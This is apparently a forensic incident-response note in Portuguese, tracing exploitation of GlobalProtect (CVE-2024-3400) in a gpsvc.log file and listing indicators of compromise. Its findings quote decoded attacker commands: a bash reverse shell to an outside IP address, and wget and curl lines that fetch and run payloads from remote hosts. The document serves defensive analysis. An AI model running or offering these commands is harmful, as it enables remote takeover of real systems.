# Phase 02 — gpsvc.log & primeiros indícios

**Objetivo:** confirmar `gpsvc.log` e localizar erros/sinais de exploração.

**Consultas executadas (DevTools):**
- gpsvc presence (sample)
- gpsvc count
- unmarshal session errors (key IOC)

**Achados:**
- `gpsvc.log` presente com 2.014 eventos (2024-04-26).
- 101 ocorrências de `failed to unmarshal session(...)`, incluindo:
  - Path traversal para `sslvpndocs` e `device_telemetry` (minute/hour).
  - Execução de comandos via backticks + `echo <base64> | bash`.
- Decodificações (amostras):
  - `bash -i >& /dev/tcp/54.162.164.22/1337 0>&1`
  - `wget -qO /var/tmp/BYhkpzVZP http://185.196.9.31:8080/...; chmod +x ...; /var/tmp/BYhkpzVZP &`
  - `curl -s -L http://138.197.162.79:65534/0dzFrRzQ.sh|bash -s`

**Interpretação:**
- Padrões compatíveis com exploração do GlobalProtect (CVE-2024-3400) e pós-execução (download de payload e reverse shell).
- IPs/URLs acima já candidatos a IoCs.

**Próximos passos (Phase 03):**
- Artefatos `/tmp/sslvpn/session_*` e endpoint `hipreport.esp`.
- Marcadores pós-execução (`device_telemetry`, `wget/curl`, `worldtimeapi.org`).
- `first_seen`/`last_seen` e **top source IPs** para consolidar timeline e IoCs.
